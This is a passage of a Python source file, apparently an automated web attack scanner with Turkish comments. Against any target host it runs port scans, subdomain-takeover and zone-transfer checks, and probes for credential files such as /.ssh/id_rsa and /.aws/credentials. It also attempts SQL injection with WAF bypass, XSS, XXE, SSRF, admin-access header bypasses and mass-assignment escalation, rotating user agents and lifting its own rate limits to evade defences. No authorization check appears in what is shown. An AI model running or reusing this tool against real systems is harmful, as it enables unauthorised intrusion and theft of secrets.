                    self.s.results["vulns"].append({"url": test_url, "type": f"SQLi WAF bypass ({db})"})
                self.s.log(f"SQLi WAF-bypass: {p}", "critical")
                return

# ============================================================
# ZERO-DAY FINDER — anomali tabanlı keşif
# ============================================================
class ZeroDayFinder:
    """
    Bilinen imzaya uymayan davranışları bulur:
    - Response diff (param A vs B)
    - HTTP method diff (GET/POST/PUT/DELETE)
    - Content-Type confusion
    - X-HTTP-Method-Override
    - Hidden param discovery (arjun-lite)
    - Error-trigger anomali
    - JWT kid injection
    - Mass assignment denemesi
    - HTTP header injection varyasyonları
    """
    def __init__(self, scanner):
        self.s = scanner

    def scan(self, url, params):
        try: self._http_method_diff(url)
        except Exception: pass
        try: self._content_type_confusion(url)
        except Exception: pass
        try: self._http_method_override(url)
        except Exception: pass
        try: self._header_variations(url)
        except Exception: pass
        try: self._param_fuzz(url)
        except Exception: pass
        if params:
            try: self._mass_assignment(url, params)
            except Exception: pass

    # --- HTTP method diff ---
    def _http_method_diff(self, url):
        methods = ["GET","POST","PUT","DELETE","PATCH","OPTIONS","HEAD","TRACE"]
        results = {}
        for m in methods:
            r = self.s._request(m, url, timeout=5, category="attack", retries=0)
            if r: results[m] = (r.status_code, len(r.text))
        if not results: return
        codes = set(v[0] for v in results.values())
        # İlginç: TRACE 200, PUT 200/201, DELETE 200
        if results.get("TRACE", (0,))[0] == 200:
            self._add(url, "TRACE method enabled (XST)")
        if results.get("PUT", (0,))[0] in (200,201,204):
            self._add(url, "PUT method enabled (write risk)")
        if results.get("DELETE", (0,))[0] in (200,204):
            self._add(url, "DELETE method enabled")
        # Method farklı davranıyor ama 405 değil
        if len(codes) > 2 and all(c not in (0,405) for c in codes):
            self._add(url, f"Method-diff anomali: {results}")

    # --- Content-Type confusion ---
    def _content_type_confusion(self, url):
        ctypes = ["application/json","application/xml","application/x-www-form-urlencoded",
                  "multipart/form-data","text/plain","text/xml"]
        payload = '{"test":"<x>"}'
        statuses = {}
        for ct in ctypes:
            r = self.s._request("POST", url, timeout=5, category="attack", retries=0,
                                data=payload, headers={"Content-Type": ct})
            if r: statuses[ct] = r.status_code
        # Aynı payload farklı Content-Type'ta farklı davranıyorsa ilginç
        if len(set(statuses.values())) > 1:
            self._add(url, f"Content-Type confusion: {statuses}")

    # --- X-HTTP-Method-Override ---
    def _http_method_override(self, url):
        headers = [
            {"X-HTTP-Method-Override": "PUT"},
            {"X-HTTP-Method-Override": "DELETE"},
            {"X-Method-Override": "PUT"},
        ]
        for h in headers:
            r = self.s._request("POST", url, timeout=5, category="attack",
                                retries=0, headers=h, data="")
            if r and r.status_code in (200,204):
                # GET ile karşılaştır
                g = self.s._request("GET", url, timeout=5, retries=0)
                if g and g.status_code != r.status_code:
                    self._add(url, f"Method override çalışıyor: {list(h.keys())[0]}")

    # --- Header varyasyonları ---
    def _header_variations(self, url):
        tests = [
            ("X-Original-URL", "/admin"),
            ("X-Rewrite-URL", "/admin"),
            ("X-Forwarded-For", "127.0.0.1"),
            ("X-Real-IP", "127.0.0.1"),
            ("X-Client-IP", "127.0.0.1"),
            ("X-Forwarded-For", "localhost"),
            ("X-Originating-IP", "127.0.0.1"),
        ]
        bl = self.s._request("GET", url, timeout=5, retries=0)
        if not bl: return
        bl_len = len(bl.text); bl_code = bl.status_code
        for hname, hval in tests:
            r = self.s._request("GET", url, timeout=5, category="attack", retries=0,
                                headers={hname: hval})
            if r and (r.status_code != bl_code or abs(len(r.text) - bl_len) > 300):
                self._add(url, f"Header '{hname}: {hval}' davranışı değiştiriyor "
                               f"({bl_code}->{r.status_code}, Δ{abs(len(r.text)-bl_len)})")

    # --- Param fuzz (arjun-lite) ---
    def _param_fuzz(self, url):
        common = ["id","user","username","file","path","url","redirect","next",
                  "page","q","search","query","debug","test","admin","action",
                  "cmd","exec","token","key","api_key","callback","jsonp",
                  "format","type","lang","locale","admin","root","config",
                  "token","session","auth","hash","sign","verify","code"]
        base = url.split("?")[0]
        bl = self.s._request("GET", base, timeout=5, retries=0)
        if not bl: return
        bl_len = len(bl.text); bl_code = bl.status_code
        hits = []
        for p in common[:30]:
            r = self.s._request("GET", f"{base}?{p}=1", timeout=5, category="attack", retries=0)
            if not r: continue
            if r.status_code != bl_code or abs(len(r.text) - bl_len) > 200:
                hits.append((p, r.status_code, len(r.text)))
        if hits:
            with self.s.lock:
                self.s.results["param_fuzz"].extend(
                    [{"url": base, "param": h[0], "status": h[1]} for h in hits])
            self.s.log(f"Param fuzz: {len(hits)} ilginç param @ {base}", "found")

    # --- Mass assignment ---
    def _mass_assignment(self, url, params):
        """Yaygın admin alanları gönder, kabul ediliyor mu bak."""
        extra = {"is_admin": "true","role": "admin","admin": "1","isAdmin": "1",
                 "user_type": "admin","is_staff": "1","verified": "true"}
        for p in params[:2]:
            for key, val in extra.items():
                test_url = f"{url.split('?')[0]}?{p}={quote('test')}&{key}={quote(val)}"
                r = self.s._request("GET", test_url, timeout=5, category="attack", retries=0)
                if r and r.status_code == 200 and ("admin" in r.text.lower() or
                                                    "welcome admin" in r.text.lower()):
                    self._add(url, f"Mass assignment şüphesi: {key}={val}")
                    return

    def _add(self, url, msg):
        with self.s.lock:
            self.s.results["zeroday_findings"].append({"url": url, "type": msg})
            self.s.results["vulns"].append({"url": url, "type": f"ZeroDay: {msg[:60]}"})
        self.s.log(f"ZeroDay: {msg[:80]}", "critical")
        self.s.notifier.send(f"[ZeroDay] {msg[:120]} @ {url}")

# ============================================================
# ANA SCANNER
# ============================================================
class ProMaxScanner:
    def __init__(self, target, bypass=False, workers=15, rps=20, task_timeout=10):
        self.target = target.strip().lower().replace("https://","").replace("http://","").split("/")[0]
        self.start = time.time()
        self.bypass = bypass
        self.workers = max(1, min(80, workers))
        self.task_timeout = max(3, min(60, task_timeout))
        self.limiter_discovery = RateLimiter(rps * 2)
        self.limiter_attack    = RateLimiter(max(3, rps // 2))
        self.lock = threading.Lock()
        self.notifier = Notifier()
        self._pending_cap = 80
        self._error_cap = 500
        self._baseline_cache = {}
        self._baseline_lock = threading.Lock()
        self._options_cache = {}
        self._options_lock = threading.Lock()
        self._sensitive_seen = set()

        base_headers = {
            "User-Agent": random.choice(UA_POOL),
            "Accept":"*/*","Accept-Language":"en-US,en;q=0.9,tr;q=0.8",
            "Connection":"keep-alive",
        }
        if SCAN_COOKIE:
            base_headers["Cookie"] = SCAN_COOKIE
            print(f"{G}[+] Cookie yüklendi{N}")

        self.pool = SessionPool(bypass, base_headers, SCAN_PROXY)
        logname = f"log_{self.target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
        self.logfile = logname
        self.logger = FileLogger(logname)
        self.logger.raw(f"# Target: {self.target}")
        self.logger.raw(f"# Proxy: {SCAN_PROXY or 'none'} | Cookie: {'yes' if SCAN_COOKIE else 'no'}")
        self.logger.raw(f"# Ports mode: {PORTS_MODE} | Subs mode: {SUBS_MODE}")

        self.results = {
            "target": self.target, "started": datetime.now().isoformat(),
            "ports":[], "ssl":{}, "headers":{}, "security_headers":{},
            "waf":None, "cloud":None, "tech":[], "cms":None, "cms_hits":[],
            "dirs":[], "subdomains":[], "vulns":[], "emails":[],
            "parameters":[], "api_endpoints":[], "backup_files":[],
            "interesting_files":[], "status_codes":{}, "wp_users":[],
            "wp_version":None, "sqli_tests":[], "blind_sqli_tests":[],
            "xss_tests":[], "nosql_tests":[], "open_redirect_tests":[],
            "ldap_tests":[], "xpath_tests":[], "websocket":{"found":False,"url":None},
            "grpc":{"found":False,"url":None}, "xxe_tests":[], "ssrf_tests":[],
            "csrf_tests":[], "jwt_tests":[], "cors_tests":[], "host_header_tests":[],
            "path_traversal_tests":[], "command_injection_tests":[],
            "file_upload_tests":[], "ssti_tests":[], "crlf_tests":[],
            "graphql_tests":[], "race_tests":[], "takeover_tests":[],
            "wayback_urls":[], "zone_transfer":[], "dns_records":{},
            "favicon_md5":None, "deserialization_hits":[], "proto_pollution":[],
            "cache_poison":[], "swagger":[], "sensitive_data":[], "soft404":None,
            "cookies":[], "csp":{}, "hsts":{}, "http2":{}, "rate_limit":{},
            "retry_events":0, "skipped":0, "errors":[], "blocked_by_waf":0,
            "zeroday_findings":[], "param_fuzz":[],
        }

        self.ports = build_ports(PORTS_MODE)
        self.subdomains = build_subs(SUBS_MODE)

        self.dirs = [
            "/", "/admin", "/login", "/wp-admin", "/phpmyadmin", "/.git", "/.env",
            "/robots.txt", "/sitemap.xml", "/favicon.ico", "/backup", "/test", "/dev",
            "/wp-content", "/wp-includes", "/server-status", "/cgi-bin",
            "/user", "/profile", "/dashboard", "/shop", "/cart", "/checkout",
            "/phpinfo.php", "/info.php", "/config.php", "/index.php", "/index.html",
            "/.htaccess", "/web.config", "/composer.json", "/package.json",
            "/api", "/api/v1", "/api/v2", "/api/v3", "/graphql", "/swagger", "/docs",
            "/.well-known", "/security.txt", "/crossdomain.xml",
            "/dump", "/export", "/import", "/sql", "/db", "/database",
            "/old", "/archive", "/copy", "/mirror", "/data", "/downloads",
            "/modules", "/themes", "/plugins", "/vendor", "/node_modules",
            "/tmp", "/logs", "/error", "/debug", "/status", "/health",
            "/oauth", "/auth", "/register", "/signup", "/reset-password",
            "/product", "/products", "/category", "/brand", "/collection",
            "/storage", "/cdn", "/static", "/assets", "/media", "/images",
            "/fonts", "/icons", "/avatar", "/logo",
            "/cpanel", "/plesk", "/webmail", "/mail", "/roundcube",
            "/adminer", "/pgadmin", "/phpPgAdmin", "/mysqladmin",
            "/server-info", "/.svn", "/.aws", "/.ssh", "/.ftp",
            "/Dockerfile", "/docker-compose.yml", "/Makefile", "/README.md",
            "/backup-old", "/temp", "/cache", "/forum", "/blog", "/news",
            "/download", "/upload", "/uploads", "/files", "/file",
            "/app", "/application", "/src", "/source", "/code", "/public",
            "/private", "/secure", "/secret", "/confidential", "/internal",
            "/backup.zip", "/backup.tar", "/backup.gz", "/backup.rar",
            "/wp-login.php", "/xmlrpc.php", "/wp-json",
            "/wp-admin/admin-ajax.php", "/wp-admin/admin-post.php",
            "/wp-admin/admin.php", "/wp-admin/install.php",
            "/wp-admin/setup-config.php", "/wp-admin/upgrade.php",
            "/.git/config", "/.git/HEAD", "/.git/index",
            "/.svn/entries", "/.svn/wc.db", "/.env.backup",
            "/.aws/credentials", "/.ssh/id_rsa", "/.ssh/authorized_keys",
            "/phpmyadmin/index.php", "/pma", "/mysql", "/sqladmin",
            "/actuator", "/actuator/health", "/actuator/env", "/actuator/beans",
            "/metrics", "/prometheus", "/debug/pprof", "/console", "/jmx-console",
            "/manager/html", "/host-manager/html",
            "/.well-known/security.txt", "/.well-known/change-password",
            "/api/swagger.json", "/api/openapi.json", "/v2/api-docs", "/v3/api-docs",
            "/openapi.json", "/swagger.json", "/swagger-ui.html", "/swagger-ui/",
            "/redoc", "/rapidoc", "/.DS_Store", "/Thumbs.db",
            "/clientaccesspolicy.xml", "/sitemap.xml.gz", "/sitemap_index.xml",
            "/login.php", "/register.php", "/signup.php", "/logout",
            "/wp-config.php.bak", "/wp-config.php~", "/wp-config.txt",
            "/.gitignore", "/.dockerignore", "/.editorconfig",
            "/.gitlab-ci.yml", "/.travis.yml", "/.circleci/config.yml",
            "/package-lock.json", "/yarn.lock", "/Gemfile", "/Gemfile.lock",
            "/requirements.txt", "/Pipfile", "/Pipfile.lock",
            "/CHANGELOG.md", "/LICENSE", "/CONTRIBUTING.md",
            "/healthz", "/healthcheck", "/livez", "/readyz", "/ping",
            "/version", "/api/version", "/info", "/env", "/config",
        ]

        self.waf_sigs = {
            "Cloudflare":["cf-ray","__cfduid","cloudflare"],
            "AWS WAF":["x-amzn-requestid","awswaf"],
            "Sucuri":["sucuri","x-sucuri-id"],
            "ModSecurity":["modsecurity","owasp"],
            "Wordfence":["wordfence","wfvt_"],
            "Akamai":["akamai","x-akamai"],
            "Imperva":["incap_ses","visid_incap"],
            "F5 BIG-IP":["bigipserver","x-wa-info"],
        }
        self.cloud_sigs = {
            "AWS":["x-amz","cloudfront","s3.amazonaws"],
            "Cloudflare":["cf-","cloudflare"],
            "Google":["x-gcs","google-cloud"],
            "Azure":["x-ms","azure"],
            "Akamai":["akamai","x-ak"],
            "Fastly":["x-fastly","fastly"],
        }

        self.sqli = SQLiTester(self)
        self.zeroday = ZeroDayFinder(self)
        self._pending_tests = []

        self.total = max(1, len(self.ports)//10 + len(self.dirs) + len(self.subdomains)//5 + 80)
        self.done = 0
        self.progress_lock = threading.Lock()
        self._last_progress = 0.0

    # ==================== LOG / PROGRESS ====================
    def log(self, msg, level="info"):
        try: self.logger.log(msg, level)
        except Exception: pass
        if level in ("critical","warning","success","found","error"):
            icons = {"error":f"{R}[-]{N}","warning":f"{Y}[!]{N}",
                     "found":f"{M}[>]{N}","critical":f"{R}{BOLD}[!]{N}",
                     "success":f"{G}[+]{N}"}
            if _TTY: print(f"{CLR}{icons.get(level,'[*]')} {msg}")
            else: print(f"{icons.get(level,'[*]')} {msg}")

    def progress(self, inc=1):
        with self.progress_lock:
            self.done += inc; d = self.done
        now = time.time()
        if now - self._last_progress < 0.3 and d < self.total: return
        self._last_progress = now
        if not _TTY: return
        pct = min(100, int((d / self.total) * 100)) if self.total else 0
        filled = int(pct / 4); bar = "#" * filled + "-" * (25 - filled)
        if d > 0:
            elapsed = time.time() - self.start
            eta = max(0, int((self.total - d) * (elapsed / d)))
            eta_s = f"{eta}s"
        else: eta_s = "..."
        print(f"\r[PROG] {bar} {pct}% | {d}/{self.total} | ETA: {eta_s}   ", end="")

    def progress_step(self, current, total_in_step):
        """Adım içi orantılı ilerleme."""
        step = max(1, total_in_step // 30)
        if current % step == 0: self.progress()

    # ==================== HTTP ====================
    def _request(self, method, url, retries=1, category="discovery", **kwargs):
        kwargs.setdefault("timeout", self.task_timeout)
        kwargs.setdefault("verify", False)
        kwargs.setdefault("allow_redirects", True)
        hdrs = kwargs.setdefault("headers", {})
        if "User-Agent" not in hdrs:
            hdrs["User-Agent"] = random.choice(UA_POOL)
        limiter = self.limiter_attack if category == "attack" else self.limiter_discovery
        for attempt in range(retries + 1):
            limiter.wait()
            try:
                r = self.pool.get().request(method, url, **kwargs)
                if r.status_code in (429, 503) and attempt < retries:
                    with self.lock: self.results["retry_events"] += 1
                    time.sleep(1.5 * (attempt + 1))
                    continue
                if r.status_code == 403 and self.results.get("waf"):
                    with self.lock: self.results["blocked_by_waf"] += 1
                    if self.results["blocked_by_waf"] % 5 == 0:
                        self.limiter_attack.set_rate(3)
                return r
            except (requests.exceptions.RequestException, OSError):
                if attempt == retries: return None
            except Exception:
                if attempt == retries: return None
        return None

    def get(self, url, **kw): return self._request("GET", url, **kw)
    def post(self, url, **kw): return self._request("POST", url, **kw)

    def _safe_run(self, fn):
        try: return fn()
        except Exception as e:
            self.logger.log(f"_safe_run: {e}", "error")
            return None

    def _get_baseline(self, url):
        base = url.split("?")[0]
        with self._baseline_lock:
            if base in self._baseline_cache:
                return self._baseline_cache[base]
        r = self.get(base, timeout=6, category="attack")
        text = r.text if r else ""
        with self._baseline_lock:
            if len(self._baseline_cache) > 500:
                # FIFO
                k = next(iter(self._baseline_cache))
                del self._baseline_cache[k]
            self._baseline_cache[base] = text
        return text

    # ==================== 1. PORT ====================
    def scan_ports(self):
        n = len(self.ports)
        self.log(f"Port tarama: {n} ({PORTS_MODE})", "info")
        threads = min(30, self.workers * 2)  # iSH-safe
        def worker(p):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(min(1.0 if n > 5000 else 1.5, self.task_timeout))
            try:
                rc = s.connect_ex((self.target, p))
                return p if rc == 0 else None
            except Exception: return None
            finally:
                try: s.close()
                except Exception: pass
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futs = [ex.submit(worker, p) for p in self.ports]
            for i, f in enumerate(as_completed(futs)):
                try: res = f.result(timeout=1)
                except Exception: res = None
                if res:
                    with self.lock: self.results["ports"].append(res)
                    self.log(f"Port {res} ACIK", "found")
                self.progress_step(i, n)

    # ==================== 2. SSL ====================
    def check_ssl(self):
        self.log("SSL/TLS", "info")
        def probe():
            ctx = ssl_module.create_default_context()
            ctx.check_hostname = False; ctx.verify_mode = ssl_module.CERT_NONE
            try: ctx.set_ciphers("DEFAULT@SECLEVEL=0")
            except Exception: pass
            with socket.create_connection((self.target, 443), timeout=5) as raw:
                with ctx.wrap_socket(raw, server_hostname=self.target) as ss:
                    c = ss.cipher(); cert = ss.getpeercert()
                    return {"active": True, "protocol": ss.version(),
                            "cipher": c[0] if c else None,
                            "cert_subject": dict(x[0] for x in cert.get("subject", [])) if cert else {},
                            "not_after": cert.get("notAfter") if cert else None}
        res = self._safe_run(probe)
        self.results["ssl"] = res or {"active": False}
        if res and res.get("active"):
            self.log(f"SSL: {res.get('protocol')} / {res.get('cipher')}", "success")
            if res.get("protocol") in ("TLSv1","TLSv1.1","SSLv3","SSLv2"):
                with self.lock:
                    self.results["vulns"].append({"url": f"https://{self.target}", "type": f"Zayıf TLS {res['protocol']}"})
                self.log(f"Zayıf TLS: {res['protocol']}", "critical")
        self.progress()

    # ==================== 3. HEADERS ====================
    def check_headers(self):
        self.log("Header analiz", "info")
        for proto in ("https","http"):
            r = self.get(f"{proto}://{self.target}/", timeout=6)
            if not r: continue
            h = dict(r.headers)
            self.results["headers"] = h
            for k, v in list(h.items())[:30]:
                self.logger.log(f"H: {k}: {str(v)[:100]}", "info")
            if "Server" in h: self.results["tech"].append(f"Server: {h['Server']}")
            if "X-Powered-By" in h: self.results["tech"].append(f"X-Powered-By: {h['X-Powered-By']}")
            sec_headers = {
                "Strict-Transport-Security":"HSTS eksik!",
                "Content-Security-Policy":"CSP eksik!",
                "X-Frame-Options":"Clickjacking riski",
                "X-Content-Type-Options":"MIME-sniff riski",
                "Referrer-Policy":"Referrer-Policy eksik",
                "Permissions-Policy":"Permissions-Policy eksik",
                "Cross-Origin-Opener-Policy":"COOP eksik",
                "Cross-Origin-Resource-Policy":"CORP eksik",
            }
            for hn, msg in sec_headers.items():
                if hn not in h:
                    self.results["security_headers"][hn] = "EKSIK"
                    self.log(f"SecHeader eksik: {hn}", "warning")
            combined = str(h).lower()
            for waf, sigs in self.waf_sigs.items():
                if any(s in combined for s in sigs):
                    self.results["waf"] = waf
                    self.log(f"WAF: {waf}", "warning")
                    self.limiter_attack.set_rate(3)
            for cloud, sigs in self.cloud_sigs.items():
                if any(s in combined for s in sigs):
                    self.results["cloud"] = cloud
                    self.log(f"Cloud: {cloud}", "found")
            break
        self.progress()

    # ==================== 4. DNS ====================
    def scan_dns(self):
        self.log("DNS", "info")
        records = {}
        if DNS_AVAILABLE:
            for t in ("A","AAAA","MX","TXT","NS","CNAME","SOA","CAA","SRV","PTR"):
                def q(t=t):
                    try:
                        ans = dns.resolver.resolve(self.target, t, lifetime=5)
                        return [str(x) for x in ans]
                    except Exception: return None
                res = self._safe_run(q)
                if res:
                    records[t] = res
                    self.log(f"DNS {t}: {res[:2]}", "found")
            def dmarc():
                try:
                    ans = dns.resolver.resolve(f"_dmarc.{self.target}", "TXT", lifetime=5)
                    return [str(x) for x in ans]
                except Exception: return None
            d = self._safe_run(dmarc)
            if d: records["DMARC"] = d
        else:
            try: records["A"] = [socket.gethostbyname(self.target)]
            except Exception: pass
        with self.lock: self.results["dns_records"] = records
        self.progress()

    # ==================== 5. CRT.SH (dedupe) ====================
    def scan_crtsh(self):
        self.log("crt.sh", "info")
        def probe():
            r = self.get(f"https://crt.sh/?q=%25.{self.target}&output=json", timeout=25)
            if not r or r.status_code != 200: return []
            try: data = r.json()
            except Exception: return []
            subs = set()
            for item in data:
                for name in (item.get("name_value") or "").split("\n"):
                    n = name.strip().lower()
                    if n.endswith(self.target) and "*" not in n and n != self.target:
                        subs.add(n)
            return list(subs)[:500]
        subs = self._safe_run(probe) or []
        existing = {s["domain"] for s in self.results["subdomains"] if s.get("domain")}
        added = 0
        for s in subs:
            if s in existing: continue
            with self.lock:
                self.results["subdomains"].append({"domain": s, "ip": None, "source": "crt.sh"})
            existing.add(s); added += 1
        self.log(f"crt.sh: +{added} yeni ({len(subs)} toplam)", "found")
        self.progress()

    # ==================== 6. SUBDOMAIN ====================
    def scan_subdomains(self):
        n = len(self.subdomains)
        self.log(f"Subdomain: {n} ({SUBS_MODE})", "info")
        threads = min(40, self.workers*2) if n < 500 else min(50, self.workers*2)
        def worker(sub):
            dom = f"{sub}.{self.target}"
            try: return (dom, socket.gethostbyname(dom))
            except Exception: return None
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futs = [ex.submit(worker, s) for s in self.subdomains]
            for i, f in enumerate(as_completed(futs)):
                try: res = f.result(timeout=1)
                except Exception: res = None
                if res:
                    with self.lock:
                        self.results["subdomains"].append({"domain": res[0], "ip": res[1], "source": "brute"})
                    self.log(f"Sub: {res[0]} -> {res[1]}", "found")
                self.progress_step(i, n)
        self.phase_takeover()
        self.progress(0)

    def phase_takeover(self):
        domains = [s["domain"] for s in self.results["subdomains"] if s.get("domain")]
        if not domains: return
        self.log(f"Takeover tarama: {len(domains)}", "info")
        with ThreadPoolExecutor(max_workers=min(10, self.workers)) as ex:
            list(ex.map(self._check_takeover, domains[:250]))

    def _check_takeover(self, dom):
        cname = None
        if DNS_AVAILABLE:
            try:
                ans = dns.resolver.resolve(dom, "CNAME", lifetime=4)
                cname = str(ans[0].target).rstrip(".").lower()
            except Exception: pass
        if not cname: return
        # HTTPS dene, olmazsa HTTP
        r = None
        for proto in ("https","http"):
            r = self.get(f"{proto}://{dom}", timeout=6)
            if r and r.status_code in (200,404): break
        if not r: return
        body = r.text.lower()
        for pattern, sigs in TAKEOVER_MAP.items():
            if re.search(pattern, cname):
                for sig in sigs:
                    if sig.lower() in body:
                        with self.lock:
                            self.results["takeover_tests"].append({"domain": dom, "cname": cname, "sig": sig, "status": "BULUNDU"})
                            self.results["vulns"].append({"url": dom, "type": f"Takeover ({cname} -> {sig[:30]})"})
                        self.log(f"Takeover: {dom}", "critical")
                        self.notifier.send(f"[Takeover] {dom}")
                        return

    # ==================== 7. WAYBACK ====================
    def scan_wayback(self):
        self.log("Wayback", "info")
        def probe():
            r = self.get(f"http://web.archive.org/cdx/search/cdx?url={self.target}/*&output=json&limit=500&collapse=urlkey", timeout=20)
            if not r or r.status_code != 200: return []
            try: data = r.json()
            except Exception: return []
            return [row[2] for row in data[1:] if len(row) >= 3]
        urls = self._safe_run(probe) or []
        with self.lock: self.results["wayback_urls"] = urls[:500]
        self.log(f"Wayback: {len(urls)} URL", "found")
        self.progress()

    # ==================== 8. ZONE TRANSFER ====================
    def scan_zone_transfer(self):
        if not DNS_AVAILABLE:
            self.log("Zone transfer: dnspython yok", "warning"); return
        self.log("DNS AXFR", "info")
        def probe():
            out = []
            try:
                ns = dns.resolver.resolve(self.target, "NS", lifetime=5)
                for nsr in ns:
                    nss = str(nsr.target).rstrip(".")
                    try:
                        z = dns.zone.from_xfr(dns.query.xfr(nss, self.target, timeout=6))
                        records = [f"{n}.{self.target}" for n in z.nodes.keys()]
                        out.append((nss, records))
                        self.log(f"AXFR BULUNDU: {nss} ({len(records)})", "critical")
                        self.notifier.send(f"[AXFR] {self.target} via {nss}")
                    except Exception: continue
            except Exception: pass
            return out
        res = self._safe_run(probe) or []
        for ns, records in res:
            with self.lock:
                self.results["zone_transfer"].append({"ns": ns, "records": records})
        self.progress()

    # ==================== 9. DİZİN ====================
    def scan_dirs(self):
        self.log(f"Dizin tarama: {len(self.dirs)}", "info")
        def worker(d):
            for proto in ("https","http"):
                url = f"{proto}://{self.target}{d}"
                r = self.get(url, timeout=min(4, self.task_timeout), allow_redirects=False)
                if r is not None: return (d, url, r)
            return None
        n = len(self.dirs)
        with ThreadPoolExecutor(max_workers=self.workers) as ex:
            futs = [ex.submit(worker, d) for d in self.dirs]
            for i, f in enumerate(as_completed(futs)):
                try: entry = f.result(timeout=1)
                except Exception: entry = None
                if entry:
                    d, url, r = entry
                    if r.status_code in (200,201,301,302,307,308,401,403,405,500,502,503):
                        with self.lock:
                            self.results["dirs"].append({"path": d, "status": r.status_code})
                            self.results["status_codes"][str(r.status_code)] = \
                                self.results["status_codes"].get(str(r.status_code),0)+1
                        self.log(f"{d} -> {r.status_code}", "found")
                        if d.startswith("/api") or d in ("/graphql","/wp-json"):
                            with self.lock:
                                self.results["api_endpoints"].append({"path": d, "status": r.status_code})
                        if r.text:
                            if 'new WebSocket(' in r.text or 'wss://' in r.text:
                                m = re.search(r'(wss?://[^\s"\']+)', r.text)
                                if m:
                                    with self.lock:
                                        self.results["websocket"] = {"found": True, "url": m.group(1)}
                            params = re.findall(r'\?([a-zA-Z0-9_\-]+)=', r.text)
                            params += re.findall(r'name=["\']([a-zA-Z0-9_\-]+)["\']', r.text)
                            for p in set(params):
                                with self.lock:
                                    if p not in self.results["parameters"]:
                                        self.results["parameters"].append(p)
                        if len(self._pending_tests) < self._pending_cap:
                            self._pending_tests.append({
                                "url": url, "d": d, "code": r.status_code,
                                "headers": dict(r.headers),
                                "text": r.text[:200_000] if r.text else "",
                            })
                self.progress_step(i, n)
        self.progress(0)

    # ==================== 10. TEST FAZI (prioritize) ====================
    def run_pending_tests(self):
        if not self._pending_tests: return
        # İlgi skoru (küçük = önce)
        def score(it):
            s = 0
            if it["code"] == 200: s += 100
            if "?" in it["url"]: s += 50
            if it["code"] in (401,403): s += 20
            if len(it["text"]) > 5000: s += 10
            return -s
        self._pending_tests.sort(key=score)
        self._pending_tests = self._pending_tests[:self._pending_cap]
        self.log(f"Test fazı: {len(self._pending_tests)} URL", "info")
        def worker(item):
            try: self._run_all_tests(item)
            except Exception as e:
                self.logger.log(f"Test hata: {e}", "error")
        with ThreadPoolExecutor(max_workers=max(3, self.workers // 3)) as ex:
            list(ex.map(worker, self._pending_tests))

    def _make_response_stub(self, item):
        class R: pass
        r = R(); r.status_code = item["code"]; r.headers = item["headers"]; r.text = item["text"]
        return r

    def _run_all_tests(self, item):
        url = item["url"]; d = item["d"]
        r = self._make_response_stub(item)
        try: base_params = list(parse_qs(urlparse(url).query).keys())
        except Exception: base_params = []
        params = list(set(base_params))

        try: self.sqli.scan(url, params)
        except Exception as e: self.logger.log(f"SQLi: {e}", "error")

        # ZeroDay
        try: self.zeroday.scan(url, params)
        except Exception as e: self.logger.log(f"ZeroDay: {e}", "error")

        self._test_xss(url, params)
        self._test_xxe(url, r)
        self._test_ssrf(url, params)
        self._test_csrf(url, r)
        self._test_jwt(url, r)
        self._test_cors(url, r)
        self._test_host_header(url)
        self._test_path_traversal(url, params)
        self._test_command_injection(url, params)
        self._test_file_upload(url, d)
        self._test_ssti(url, params)
        self._test_crlf(url, params)
        self._test_open_redirect(url, params)
        self._test_nosql(url, r)
        self._test_ldap(url, params)
        self._test_xpath(url, params)
        self._test_proto_pollution(url)
        self._test_deserialization(url, r)
        self._test_cache_poison(url)
        if "/graphql" in d: self._test_graphql(url)
        self._harvest_emails(url, r.text)
        self._scan_sensitive(url, r.text)
        self._check_dir_listing(url, r.text)
        self._extract_comments(url, r.text)

    # ---------- XSS (limiter bypass temp) ----------
    def _test_xss(self, url, params):
        if not params: return
        base_url = url.split("?")[0]
        bl = self._get_baseline(base_url)
        saved = self.limiter_attack
        self.limiter_attack = RateLimiter(50)
        try:
            for p in params[:2]:
                for payload in XSS_PAYLOADS[:6]:
                    test_url = f"{base_url}?{p}={quote(payload, safe='')}"
                    r = self.get(test_url, timeout=6, category="attack")
                    if r and payload in r.text and payload not in bl:
                        with self.lock:
                            self.results["xss_tests"].append({"url": test_url, "payload": payload[:60], "status": "BULUNDU"})
                            self.results["vulns"].append({"url": test_url, "type": "Reflected XSS"})
                        self.log(f"XSS: {p}", "critical")
                        self.notifier.send(f"[XSS] {test_url}")
                        return
        finally:
            self.limiter_attack = saved

    # ---------- XXE ----------
    def _test_xxe(self, url, r):
        ctype = (r.headers.get("Content-Type") or "").lower()
        needs = "xml" in ctype or url.endswith((".xml","/xml","/soap","/wsdl"))
        if not needs:
            with self._options_lock:
                cached = self._options_cache.get(url)
            if cached is None:
                opts = self._request("OPTIONS", url, timeout=4)
                allow = (opts.headers.get("Allow") or "").upper() if opts else ""
                with self._options_lock: self._options_cache[url] = allow
                cached = allow
            if "POST" not in cached: return
        for payload, markers in XXE_PAYLOADS:
            try:
                rr = self.post(url, data=payload, headers={"Content-Type":"application/xml"}, timeout=8, category="attack")
                if not rr: continue
                for m in markers:
                    if m in rr.text:
                        with self.lock:
                            self.results["xxe_tests"].append({"url": url, "status": "BULUNDU"})
                            self.results["vulns"].append({"url": url, "type": "XXE"})
                        self.log(f"XXE: {url}", "critical")
                        self.notifier.send(f"[XXE] {url}")
                        return
            except Exception: continue

    # ---------- SSRF (2-hit confirm) ----------
    def _test_ssrf(self, url, params):
        if not params: return
        base_url = url.split("?")[0]
        bl = self._get_baseline(base_url)
        for p in params[:2]:
            hits = 0
            for tgt, markers in SSRF_TARGETS:
                test_url = f"{base_url}?{p}={quote(tgt, safe='')}"
                r = self.get(test_url, timeout=8, category="attack")
                if not r: continue
                if any(m in r.text and m not in bl for m in markers):
                    hits += 1
                    if hits >= 2:
                        with self.lock:
                            self.results["ssrf_tests"].append({"url": test_url, "status": "BULUNDU"})
                            self.results["vulns"].append({"url": test_url, "type": f"SSRF ({tgt[:30]})"})
                        self.log(f"SSRF CONFIRMED: {tgt[:40]}", "critical")
                        self.notifier.send(f"[SSRF] {test_url}")
                        return

    # ---------- CSRF (body cap) ----------
    def _test_csrf(self, url, r):
        if not r.text or "<form" not in r.text.lower(): return
        body = r.text[:50_000]
        forms = re.findall(r"<form[^>]*>(.*?)</form>", body, re.DOTALL | re.IGNORECASE)
        for f in forms:
            has_token = re.search(r"csrf|_token|authenticity|nonce", f, re.IGNORECASE)
